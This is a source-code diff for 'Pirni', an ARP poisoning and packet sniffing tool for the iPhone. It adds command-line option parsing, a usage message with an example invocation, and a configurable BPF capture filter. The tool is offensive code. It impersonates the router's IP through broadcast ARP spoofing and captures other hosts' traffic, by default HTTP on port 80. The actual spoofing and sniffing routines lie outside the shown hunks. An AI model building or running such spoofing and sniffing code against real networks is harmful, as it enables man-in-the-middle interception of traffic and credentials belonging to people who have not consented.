@@ -1,7 +1,16 @@
 /* Pirni ARP poisoning and packet sniffing v0.1 -- n1mda, for the iPhone
-	compile with gcc pirni.c -o pirni -lnet -pthread */
+	compile with gcc pirni.c -o pirni -lpcap -lnet -pthread */
 	
 #include "pirni.h"
+
+void print_usage(char *name)
+{
+	printf("Pirni ARP Spoofer and packet sniffer v0.1\n\n");
+	printf("Usage:\t%s -i interface -s source_ip -b broadcast_ip -f [BPF_Filer]\n", name);
+	printf("Ex:\t%s -i en0 -s 192.168.0.1 -b 255.255.255.255 -f 'tcp dst port 80'\n", name);
+	
+	return;
+}
 
 int main(int argc, char *argv[])
 {
@@ -10,14 +19,12 @@ int main(int argc, char *argv[])
 	
 	/* Error buffer and device */
 	char			errbuf[LIBNET_ERRBUF_SIZE];
-	char			*device = argv[1];
-	
-	
-	/* HW and IP Adresses */
+	char			*BPFfilter;
 	static u_char	SrcHW[ETH_ALEN];
 	//static u_char	DstHW[ETH_ALEN]					= {0x00, 0x23, 0x12, 0xc1, 0xec, 0xae};
 	static u_char	DstHW[ETH_ALEN]					= {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
-	u_long			SrcIP = inet_addr(argv[2]), DstIP = inet_addr(argv[3]);
+	int c;
+
 
 	/* Structure for local MAC */
 	struct libnet_ether_addr *local_mac;
@@ -27,9 +34,44 @@ int main(int argc, char *argv[])
 		exit(1);
 	}
 	
-	if(argc != 4) {
-		printf("Usage:\t%s interface [SrcIP] [BroadcastIP]\n", argv[0]);
-		exit(1);
+	while((c = getopt(argc, argv, "di:s:b:f:o:")) != -1) {
+		switch(c) {
+			case 'd':
+						//arpSpoof = FALSE;
+						break;
+			case 'i':
+						device = optarg;
+						break;
+			case 's':
+						routerIP = optarg;
+						SrcIP = inet_addr(optarg);
+						break;
+			case 'b':
+						DstIP = inet_addr(optarg);
+						break;
+			case 'f':
+						BPFfilter = optarg;
+						break;
+			case 'o':
+						outputFile = optarg;
+						break;
+			case '?':
+						printf("Unrecognized option: -%c\n", optopt);
+						exit(2);
+						break;
+			default:
+						print_usage(argv[0]);
+						exit(2);
+					}
+				}
+
+
+	if(device == NULL) {
+		print_usage(argv[0]);
+		exit(2);
+	}
+	if(BPFfilter == NULL) {
+		BPFfilter = "";
 	}
 	
 	printf("[+] Initializing libnet on %s\n", device);
@@ -97,7 +139,7 @@ int main(int argc, char *argv[])
 	/* Send ARP request */
 
 	LaunchThread();
-	initSniffer("tcp dst port 80");
+	initSniffer(BPFfilter);
 	
 	libnet_destroy(l);
 	return 0;
